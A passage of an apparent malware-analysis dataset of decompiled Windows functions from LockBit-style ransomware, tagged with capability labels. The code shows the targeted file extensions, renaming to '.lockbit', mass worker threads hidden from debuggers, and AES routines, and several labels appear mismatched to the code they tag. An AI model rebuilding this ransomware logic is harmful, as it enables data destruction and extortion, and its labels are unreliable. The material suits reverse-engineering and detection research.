var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = param_1;\n    var_4h = (*_sym.imp.SHLWAPI.dll_PathFindExtensionW)(param_1);\n    var_54h = 0x72002e;\n    uVar8 = 0;\n    var_50h = 0x720061;\n    var_4ch._0_2_ = 0;\n    var_60h = 0x7a002e;\n    var_5ch = 0x700069;\n    var_58h._0_2_ = 0;\n    var_18h = 0x37002e;\n    var_14h = 0x7a;\n    var_6ch = 0x63002e;\n    var_68h = 0x70006b;\n    var_64h._0_2_ = 0;\n    var_118h = 0x64002e;\n    var_114h = 0x630061;\n    var_110h = 0x610070;\n    var_10ch = 99;\n    var_10h = 0x64002e;\n    var_ch = 0x62;\n    var_128h = 0x64002e;\n    var_124h = 0x2d0062;\n    var_120h = 0x680073;\n    var_11ch = 0x6d;\n    var_138h = 0x64002e;\n    var_134h = 0x2d0062;\n    var_130h = 0x610077;\n    var_12ch = 0x6c;\n    var_78h = 0x64002e;\n    var_74h = 0x330062;\n    var_70h._0_2_ = 0;\n    var_84h = 0x64002e;\n    var_80h = 0x660062;\n    var_7ch._0_2_ = 0;\n    var_90h = 0x64002e;\n    var_8ch = 0x630062;\n    var_88h._0_2_ = 0;\n    var_9ch = 0x64002e;\n    var_98h = 0x730062;\n    var_94h._0_2_ = 0;\n    var_a8h = 0x64002e;\n    var_a4h = 0x740062;\n    var_a0h._0_2_ = 0;\n    var_b4h = 0x64002e;\n    var_b0h = 0x760062;\n    var_ach._0_2_ = 0;\n    var_c0h = 0x66002e;\n    var_bch = 0x6d0072;\n    var_b8h._0_2_ = 0;\n    var_cch = 0x6d002e;\n    var_c8h = 0x660064;\n    var_c4h._0_2_ = 0;\n    var_d8h = 0x6d002e;\n    var_d4h = 0x670072;\n    var_d0h._0_2_ = 0;\n    var_e4h = 0x6d002e;\n    var_e0h = 0x620077;\n    var_dch._0_2_ = 0;\n    var_f0h = 0x6d002e;\n    var_ech = 0x640079;\n    var_e8h._0_2_ = 0;\n    var_fch = 0x6e002e;\n    var_f8h = 0x660064;\n    var_f4h._0_2_ = 0;\n    var_108h = 0x71002e;\n    var_104h = 0x790072;\n    var_100h._0_2_ = 0;\n    var_24h = 0x73002e;\n    var_20h = 0x620064;\n    var_1ch._0_2_ = 0;\n    var_30h = 0x73002e;\n    var_2ch = 0x660064;\n    var_28h._0_2_ = 0;\n    var_34h._0_2_ = 0;\n    var_14ch._0_2_ = 0;\n    iVar7 = 0;\n    var_40h._0_2_ = 0;\n    var_210h = &var_54h;\n    var_20ch = &var_60h;\n    var_208h = &var_18h;\n    var_204h = &var_6ch;\n    var_200h = &var_118h;\n    var_1fch = &var_10h;\n    var_1f8h = &var_128h;\n    var_1f4h = &var_138h;\n    var_1f0h = &var_78h;\n    var_1ech = &var_84h;\n    var_1e8h = &var_90h;\n    var_1e4h = &var_9ch;\n    var_1e0h = &var_a8h;\n    var_1dch = &var_b4h;\n    var_1d8h = &var_c0h;\n    var_1d4h = &var_cch;\n    var_1d0h = &var_d8h;\n    var_1cch = &var_e4h;\n    var_1c8h = &var_f0h;\n    var_1c4h = &var_fch;\n    var_1c0h = &var_108h;\n    var_1bch = &var_24h;\n    var_1b8h = &var_30h;\n    var_1b4h = &var_3ch;\n    var_1b0h = &var_148h;\n    var_1ach = &var_15ch;\n    var_1a8h = &var_170h;\n    var_3ch = 0x73002e;\n    var_38h = 0x6c0071;\n    var_148h = 0x73002e;\n    var_144h = 0x6c0071;\n    var_140h = 0x740069;\n    var_13ch = 0x65;\n    var_15ch = 0x73002e;\n    var_158h = 0x6c0071;\n    var_154h = 0x740069;\n    var_150h = 0x330065;\n    var_170h = 0x73002e;\n    var_16ch = 0x6c0071;\n    var_168h = 0x740069;\n    var_164h = 0x640065;\n    var_160h = 0x62;\n    var_48h = 0x74002e;\n    var_44h = 0x64006d;\n    var_1a4h = &var_48h;\n    var_1a0h = 0;\n    do {\n        if ((&var_210h)[iVar7] == NULL) break;\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)((&var_210h)[iVar7], var_4h);\n        if (iVar4 == 0) {\n            uVar8 = 1;\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xff);\n    iVar7 = 0;\n    uVar6 = var_8h;\n    while( true ) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(uVar6, 0xc0010000, 0, 0, 3, 0x50000000, 0);\n        uVar6 = var_8h;\n        if (iVar4 != -1) {\n            var_194h = *0x428228;\n            var_190h = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, 0x20a);\n            ARG_1 = 0x730025;\n            var_174h._0_2_ = 0;\n            var_184h = 0x6c002e;\n            var_180h = 0x63006f;\n            var_17ch = 0x62006b;\n            var_178h = 0x740069;\n            var_4h = var_190h;\n            (*_sym.imp.USER32.dll_wsprintfW)(var_190h, &ARG_1, var_8h);\n            iVar7 = (*_sym.imp.ntdll.dll_NtSetInformationFile)(iVar4, &var_230h, &var_194h, 8, 0x1e);\n            if ((iVar7 == 0) && (pauVar5 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, 0x40068),  pauVar5 != NULL)) {\n                *pauVar5 = ZEXT816(0);\n                *pauVar5[1] = 0;\n                *pauVar5[3] = uVar8;\n                *(pauVar5[2] + 8) = 0;\n                *(pauVar5[2] + 0xc) = 0;\n                iVar7 = (*_sym.imp.ntdll.dll_NtQueryInformationFile)(iVar4, &var_238h, &var_228h, 0x18, 5);\n                if (iVar7 == 0) {\n                    *(pauVar5[1] + 8) = var_220h;\n                    *(pauVar5[1] + 0xc) = var_21ch;\n                    if ((0 < var_21ch) || ((-1 < var_21ch && (0xf < var_220h)))) {\n                        *(pauVar5[2] + 4) = 4;\n                        *(pauVar5[1] + 8) = var_220h - 0x10;\n                        var_21ch = var_21ch - (var_220h < 0x10);\n                        *(*pauVar5 + 8) = var_220h - 0x10;\n                        puVar1 = pauVar5[1] + 8;\n                        uVar2 = *puVar1;\n                        *puVar1 = *puVar1 + 0x10;\n                        *(*pauVar5 + 0xc) = var_21ch;\n                        *(pauVar5[1] + 0xc) = var_21ch;\n                        *(pauVar5[1] + 0xc) = *(pauVar5[1] + 0xc) + (0xffffffef < uVar2);\n                        *pauVar5[1] = 0;\n                        *pauVar5[2] = iVar4;\n                        fcn.00412920(pauVar5[0x4003] + 4, 0x10);\n                        fcn.00412920(pauVar5[0x4004] + 4, 0x10);\n                        var_18ch = (*_sym.imp.KERNEL32.dll_ReadFile)(*pauVar5[2], pauVar5[3] + 4, 0x10, 0, pauVar5);\n                        pcVar3 = _sym.imp.KERNEL32.dll_GlobalFree;\n                        if ((var_18ch == 0) && (*(in_FS_OFFSET + 0x34) != 0x3e5)) {\n                            (*_sym.imp.KERNEL32.dll_GlobalFree)(pauVar5);\n                            (*pcVar3)(var_4h);\n                            (*_sym.imp.ntdll.dll_NtClose)(iVar4);\n                            return var_18ch;\n                        }\n                        fcn.00417f20();\n                        pcVar3 = _sym.imp.KERNEL32.dll_Sleep;\n                        LOCK();\n                        iVar7 = *0x428420 + 1;\n                        iVar4 = *0x428420 + 1;\n                        *0x428420 = iVar7;\n                        if (500 < iVar4) {\n                            do {\n                                (*pcVar3)(3);\n                            } while (0x31 < *0x428420);\n                        }\n                        return 1;\n                    }\n                }\n                pcVar3 = _sym.imp.KERNEL32.dll_GlobalFree;\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(pauVar5);\n                (*pcVar3)(var_4h);\n            }\n            (*_sym.imp.ntdll.dll_NtClose)(iVar4);\n            return 0;\n        }\n        if (*(in_FS_OFFSET + 0x34) != 5) {\n            return 0;\n        }\n        iVar4 = fcn.00417880();\n        if ((iVar4 != 1) && (iVar4 = fcn.004127a0(),  iVar4 != 1)) break;\n        if (1 < iVar7) {\n            return 0;\n        }\n        iVar7 = iVar7 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 4010
    },
    "0041a450": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0041a450(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint uStack1456;\n    uchar *puStack1452;\n    uchar auStack1432 [1428];\n    \n    puStack1452 = auStack1432;\n    uStack1456 = 0x202;\n    iVar2 = (*_sym.imp.WS2_32.dll_WSAStartup)();\n    if (iVar2 == 0) {\n        *0x42822c = (*_sym.imp.msvcrt.dll_malloc)(8);\n        if (*0x42822c != 0) {\n            (*_sym.imp.ntdll.dll_RtlInitializeSListHead)(*0x42822c);\n            (*_sym.imp.ntdll.dll_RtlInitializeCriticalSection)(0x4283dc);\n            pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n            (*_sym.imp.KERNEL32.dll_Sleep)(15000);\n            fcn.0041a130();\n            if (*0x428438 != 0) {\n                uVar4 = 0;\n                do {\n                    iVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00419bd0, 0, 0, &uStack1456);\n                    if (iVar2 != -1) {\n                        (*_sym.imp.ntdll.dll_NtSetInformationThread)(iVar2, 0x11, 0, 0);\n                    }\n                    uVar4 = uVar4 + 1;\n                } while (uVar4 < 0xff);\n                do {\n                    do {\n                        (*pcVar1)(1000);\n                    } while (*0x428438 != 0);\n                } while (*0x428434 != 0);\n                (*_sym.imp.ntdll.dll_RtlInterlockedFlushSList)(*0x42822c);\n                (*_sym.imp.ntdll.dll_RtlDeleteCriticalSection)(0x4283dc);\n                (*_sym.imp.WS2_32.dll_WSACleanup)();\n                if (*0x42822c != 0) {\n                    (*_sym.imp.msvcrt.dll_free)(*0x42822c);\n                }\n                (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n                pcVar1 = swi(3);\n                uVar3 = (*pcVar1)();\n                return uVar3;\n            }\n            (*_sym.imp.ntdll.dll_RtlInterlockedFlushSList)(*0x42822c);\n            (*_sym.imp.ntdll.dll_RtlDeleteCriticalSection)(0x4283dc);\n        }\n        (*_sym.imp.WS2_32.dll_WSACleanup)();\n    }\n    return 0;\n}\n",
        "token_count": 591
    },
    "0041a6b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a6b0(int32_t arg_8h, int32_t arg_ch, uchar *arg_10h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t in_FS_OFFSET;\n    uint var_3ah;\n    \n    uVar3 = *0x42843c;\n    iVar1 = *(*(in_FS_OFFSET + 0x18) + 0x30);\n    if (*(arg_8h + 0x18) != *(iVar1 + 8)) {\n        *arg_10h = 0;\n        return;\n    }\n    uVar4 = *0x428400;\n    uVar5 = *0x4283fc;\n    if (arg_ch == 0) {\n        *0x428400 = *(arg_8h + 0x30);\n        *0x4283fc = *(arg_8h + 0x28);\n        fcn.00406d70(iVar1, arg_10h);\n        uVar4 = fcn.00406c40();\n        uVar5 = uVar3;\n    }\n    pcVar2 = _sym.imp.ntdll.dll_RtlInitUnicodeString;\n    (*_sym.imp.ntdll.dll_RtlInitUnicodeString)(arg_8h + 0x24, uVar5);\n    (*pcVar2)(arg_8h + 0x2c, uVar4);\n    *arg_10h = 1;\n    return;\n}\n",
        "token_count": 344
    },
    "0041a740": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0041a740(uint param_1)\n\n{\n    int32_t *piVar1;\n    int16_t *piVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    int16_t *piVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint uVar8;\n    uint var_154h;\n    uint var_fch;\n    uint var_5eh;\n    uint var_14h;\n    uint var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    piVar7 = NULL;\n    var_8h = NULL;\n    var_ch = NULL;\n    var_4h = (*_sym.imp.ole32.dll_CoInitializeEx)(0, 2);\n    piVar2 = fcn.00407240(extraout_ECX, var_4h);\n    iVar6 = 0x4d;\n    piVar5 = piVar2;\n    do {\n        piVar5 = piVar5 + 1;\n        *piVar5 = *piVar2 ^ *piVar5;\n        iVar6 = iVar6 + -1;\n    } while (iVar6 != 0);\n    piVar2[0x4e] = 0;\n    uVar3 = fcn.0041a570(0, &var_8h);\n    piVar1 = var_8h;\n    if (uVar3 == 0) {\n        if (var_8h == NULL) {\n            uVar3 = 0x8007000e;\n            goto code_r0x0041a8b3;\n        }\n        uVar8 = extraout_ECX_00;\n        fcn.00407510(extraout_ECX_00, var_4h);\n        var_8h = fcn.00406d00();\n        puVar4 = fcn.00407640(extraout_ECX_01, var_4h);\n        iVar6 = 0x79;\n        piVar5 = puVar4 + 2;\n        do {\n            *piVar5 = *piVar5 ^ *puVar4;\n            iVar6 = iVar6 + -1;\n            piVar5 = piVar5 + 1;\n        } while (iVar6 != 0);\n        *(puVar4 + 0xf4) = 0;\n        uVar3 = (**(*piVar1 + 0x28))(piVar1, 0x80000002, puVar4 + 2, var_8h, param_1);\n        if (-1 < uVar3) {\n            piVar2 = fcn.00407b20(uVar8, var_4h, extraout_ECX_02);\n            iVar6 = 0x4d;\n            piVar5 = piVar2;\n            do {\n                piVar5 = piVar5 + 1;\n                *piVar5 = *piVar5 ^ *piVar2;\n                iVar6 = iVar6 + -1;\n            } while (iVar6 != 0);\n            piVar2[0x4e] = 0;\n            uVar3 = fcn.0041a570(0, &var_ch);\n            piVar7 = var_ch;\n            if (uVar3 == 0) {\n                if (var_ch == NULL) {\n                    uVar3 = 0x8007000e;\n                }\n                else {\n                    uVar3 = (**(*var_ch + 0x38))(var_ch, 0);\n                }\n            }\n        }\n    }\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1);\n    }\n    if (piVar7 != NULL) {\n        (**(*piVar7 + 8))(piVar7);\n    }\ncode_r0x0041a8b3:\n    if (var_4h == 0) {\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    return ~uVar3 >> 0x1f;\n}\n",
        "token_count": 931
    },
    "00408400": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00408400(uint *arg_8h, uint arg_ch, uint32_t arg_10h, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint arg_80h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint var_31ch;\n    uint var_204h;\n    uchar var_1f4h;\n    uchar var_1f3h;\n    uchar var_1f2h;\n    uint var_1f1h;\n    uchar var_1edh;\n    uint var_1ech;\n    uint var_64h;\n    uint var_44h;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    if (0x180 < arg_10h) {\n        return -0x38;\n    }\n    fcn.004124f0(&var_204h, 0, 0x1a0);\n    fcn.00408a80(&var_31ch);\n    var_1f1h._0_1_ = arg_10h;\n    var_1f4h = arg_10h >> 0x18;\n    var_1f3h = arg_10h >> 0x10;\n    var_1f2h = arg_10h >> 8;\n    var_1edh = 0x30;\n    fcn.004124d0(&var_1ech, arg_ch, arg_10h);\n    uVar7 = arg_10h + 0x19;\n    *(&var_1ech + arg_10h) = 0x80;\n    iVar1 = 0;\n    do {\n        *(&var_64h + iVar1) = iVar1;\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x20);\n    var_4h = uVar7;\n    iVar2 = fcn.00408aa0(&var_31ch, &var_64h, 0x100);\n    iVar1 = iVar2;\n    if (iVar2 == 0) {\n        do {\n            var_14h = 0;\n            uStack20 = 0;\n            uStack16 = 0;\n            uStack12 = 0;\n            _var_14h = ZEXT816(0);\n            if (uVar7 != 0) {\n                iVar5 = -0x1f0;\n                do {\n                    iVar1 = 0;\n                    do {\n                        puVar4 = &var_14h + iVar1;\n                        iVar1 = iVar1 + 1;\n                        *puVar4 = *puVar4 ^ puVar4[iVar5];\n                    } while (iVar1 < 0x10);\n                    iVar5 = iVar5 + 0x10;\n                    uVar3 = uVar7;\n                    if (0xf < uVar7) {\n                        uVar3 = 0x10;\n                    }\n                    uVar7 = uVar7 - uVar3;\n                    iVar1 = fcn.00408a30(&var_31ch, 1, &var_14h, &var_14h);\n                    if (iVar1 != 0) goto code_r0x00408594;\n                } while (uVar7 != 0);\n                uVar7 = var_4h;\n            }\n            var_204h._3_1_ = var_204h._3_1_ + '\\x01';\n            *(&var_44h + iVar2) = CONCAT412(uStack12, CONCAT48(uStack16, CONCAT44(uStack20, var_14h)));\n            iVar2 = iVar2 + 0x10;\n        } while (iVar2 < 0x30);\n        iVar1 = fcn.00408aa0(&var_31ch, &var_44h, 0x100);\n        if (iVar1 == 0) {\n            iVar2 = 0;\n            puVar6 = arg_8h;\n            do {\n                iVar1 = fcn.00408a30(&var_31ch, 1, &var_24h, &var_24h);\n                if (iVar1 != 0) break;\n                iVar2 = iVar2 + 0x10;\n                *puVar6 = var_24h;\n                puVar6[1] = uStack36;\n                puVar6[2] = uStack32;\n                puVar6[3] = uStack28;\n                puVar6 = puVar6 + 4;\n            } while (iVar2 < 0x30);\n        }\n    }\ncode_r0x00408594:\n    fcn.00408a60(&var_31ch);\n    fcn.0040eda0(&var_204h, 0x1a0);\n    fcn.0040eda0(&var_44h, 0x30);\n    fcn.0040eda0(&var_64h, 0x20);\n    fcn.0040eda0(&var_14h, 0x10);\n    if (iVar1 != 0) {\n        fcn.0040eda0(arg_8h, 0x30);\n    }\n    return iVar1;\n}\n",
        "token_count": 1385
    },
    "00408aa0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408aa0(int32_t *arg_8h, uint32_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_10h == 0x80) {\n        *arg_8h = 10;\n    }\n    else if (arg_10h == 0xc0) {\n        *arg_8h = 0xc;\n    }\n    else {\n        if (arg_10h != 0x100) {\n            return 0xffffffe0;\n        }\n        *arg_8h = 0xe;\n    }\n    arg_8h[1] = arg_8h + 2;\n    uVar4 = *arg_ch;\n    arg_8h[2] = uVar4;\n    arg_8h[3] = arg_ch[1];\n    arg_8h[4] = arg_ch[2];\n    uVar3 = arg_ch[3];\n    arg_8h[5] = uVar3;\n    if (*arg_8h == 10) {\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[uVar3 >> 0x18]), str.cw[uVar3 >> 0x10 & 0xff]), \n                         str.cw[uVar3 >> 8 & 0xff]) ^ uVar4 ^ 1;\n        uVar1 = arg_8h[3] ^ uVar4;\n        arg_8h[6] = uVar4;\n        uVar2 = arg_8h[4] ^ uVar1;\n        arg_8h[7] = uVar1;\n        uVar3 = uVar3 ^ uVar2;\n        arg_8h[9] = uVar3;\n        arg_8h[8] = uVar2;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[uVar3 >> 0x18]), str.cw[uVar3 >> 0x10 & 0xff]), \n                         str.cw[uVar3 >> 8 & 0xff]) ^ uVar4 ^ 2;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[10] = uVar4;\n        arg_8h[0xb] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0xc] = uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0xd] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[uVar3 >> 0x18]), str.cw[uVar3 >> 0x10 & 0xff]), \n                         str.cw[uVar3 >> 8 & 0xff]) ^ uVar4 ^ 4;\n        arg_8h[0xe] = uVar4;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[0xf] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0x10] = uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x11] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[uVar3 >> 0x18]), str.cw[uVar3 >> 0x10 & 0xff]), \n                         str.cw[uVar3 >> 8 & 0xff]) ^ uVar4 ^ 8;\n        arg_8h[0x12] = uVar4;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[0x13] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0x14] = uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x15] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[uVar3 >> 0x18]), str.cw[uVar3 >> 0x10 & 0xff]), \n                         str.cw[uVar3 >> 8 & 0xff]) ^ uVar4 ^ 0x10;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[0x16] = uVar4;\n        arg_8h[0x17] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x18] = uVar2;\n        arg_8h[0x19] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[uVar3 >> 0x18]), str.cw[uVar3 >> 0x10 & 0xff]), \n                         str.cw[*(arg_8h + 0x65)]) ^ uVar4 ^ 0x20;\n        arg_8h[0x1a] = uVar4;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[0x1b] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0x1c] = uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x1d] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[*(arg_8h + 0x77)]), str.cw[*(arg_8h + 0x76)]), \n                         str.cw[*(arg_8h + 0x75)]) ^ uVar4 ^ 0x40;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[0x1e] = uVar4;\n        arg_8h[0x1f] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0x20] = uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x21] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[*(arg_8h + 0x87)]), str.cw[*(arg_8h + 0x86)]), \n                         str.cw[*(arg_8h + 0x85)]) ^ uVar4 ^ 0x80;\n        arg_8h[0x22] = uVar4;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[0x23] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0x24] = uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x25] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[*(arg_8h + 0x97)]), str.cw[*(arg_8h + 0x96)]), \n                         str.cw[*(arg_8h + 0x95)]) ^ uVar4 ^ 0x1b;\n        arg_8h[0x26] = uVar4;\n        uVar1 = uVar4 ^ uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0x27] = uVar1;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x29] = uVar3;\n        arg_8h[0x28] = uVar2;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[*(arg_8h + 0xa7)]), str.cw[*(arg_8h + 0xa6)]), \n                         str.cw[*(arg_8h + 0xa5)]) ^ uVar4 ^ 0x36;\n        uVar1 = uVar1 ^ uVar4;\n        arg_8h[0x2a] = uVar4;\n        arg_8h[0x2b] = uVar1;\n        uVar1 = uVar1 ^ uVar2;\n        arg_8h[0x2c] = uVar1;\n        arg_8h[0x2d] = uVar1 ^ uVar3;\n    }\n    return 0;\n}\n",
        "token_count": 2065
    },
    "00408fa0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408fa0(int32_t *arg_8h, uint32_t *arg_ch, uchar *arg_10h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = arg_8h[1];\n    uVar2 = arg_ch[1] ^ puVar1[1];\n    uVar8 = *arg_ch ^ *puVar1;\n    uVar9 = arg_ch[2] ^ puVar1[2];\n    uVar4 = arg_ch[3] ^ puVar1[3];\n    puVar1 = puVar1 + 4;\n    iVar3 = *arg_8h >> 1;\n    while (iVar3 = iVar3 + -1,  0 < iVar3) {\n        uVar5 = *((uVar4 >> 8 & 0xff) * 4 + 0x41c980) ^ *((uVar9 >> 0x10 & 0xff) * 4 + 0x41cd80) ^\n                *((uVar2 >> 0x18) * 4 + 0x41d180) ^ *((uVar8 & 0xff) * 4 + 0x41c580) ^ *puVar1;\n        uVar6 = *((uVar4 >> 0x10 & 0xff) * 4 + 0x41cd80) ^ *((uVar8 >> 8 & 0xff) * 4 + 0x41c980) ^\n                *((uVar9 >> 0x18) * 4 + 0x41d180) ^ *((uVar2 & 0xff) * 4 + 0x41c580) ^ puVar1[1];\n        uVar7 = *((uVar2 >> 8 & 0xff) * 4 + 0x41c980) ^ *((uVar8 >> 0x10 & 0xff) * 4 + 0x41cd80) ^\n                *((uVar4 >> 0x18) * 4 + 0x41d180) ^ *((uVar9 & 0xff) * 4 + 0x41c580) ^ puVar1[2];\n        uVar4 = *((uVar9 >> 8 & 0xff) * 4 + 0x41c980) ^ *((uVar2 >> 0x10 & 0xff) * 4 + 0x41cd80) ^\n                *((uVar8 >> 0x18) * 4 + 0x41d180) ^ *((uVar4 & 0xff) * 4 + 0x41c580) ^ puVar1[3];\n        uVar8 = *((uVar4 >> 8 & 0xff) * 4 + 0x41c980) ^ *((uVar7 >> 0x10 & 0xff) * 4 + 0x41cd80) ^\n                *((uVar6 >> 0x18) * 4 + 0x41d180) ^ *((uVar5 & 0xff) * 4 + 0x41c580) ^ puVar1[4];\n        uVar2 = *((uVar4 >> 0x10 & 0xff) * 4 + 0x41cd80) ^ *((uVar5 >> 8 & 0xff) * 4 + 0x41c980) ^\n                *((uVar7 >> 0x18) * 4 + 0x41d180) ^ *((uVar6 & 0xff) * 4 + 0x41c580) ^ puVar1[5];\n        uVar9 = *((uVar6 >> 8 & 0xff) * 4 + 0x41c980) ^ *((uVar5 >> 0x10 & 0xff) * 4 + 0x41cd80) ^\n                *((uVar4 >> 0x18) * 4 + 0x41d180) ^ *((uVar7 & 0xff) * 4 + 0x41c580) ^ puVar1[6];\n        uVar4 = *((uVar7 >> 8 & 0xff) * 4 + 0x41c980) ^ *((uVar6 >> 0x10 & 0xff) * 4 + 0x41cd80) ^\n                *((uVar5 >> 0x18) * 4 + 0x41d180) ^ *((uVar4 & 0xff) * 4 + 0x41c580) ^ puVar1[7];\n        puVar1 = puVar1 + 8;\n    }\n    uVar5 = *((uVar4 >> 8 & 0xff) * 4 + 0x41c980) ^ *((uVar9 >> 0x10 & 0xff) * 4 + 0x41cd80) ^\n            *((uVar2 >> 0x18) * 4 + 0x41d180) ^ *((uVar8 & 0xff) * 4 + 0x41c580) ^ *puVar1;\n    uVar6 = *((uVar4 >> 0x10 & 0xff) * 4 + 0x41cd80) ^ *((uVar8 >> 8 & 0xff) * 4 + 0x41c980) ^\n            *((uVar9 >> 0x18) * 4 + 0x41d180) ^ *((uVar2 & 0xff) * 4 + 0x41c580) ^ puVar1[1];\n    uVar7 = *((uVar2 >> 8 & 0xff) * 4 + 0x41c980) ^ *((uVar8 >> 0x10 & 0xff) * 4 + 0x41cd80) ^\n            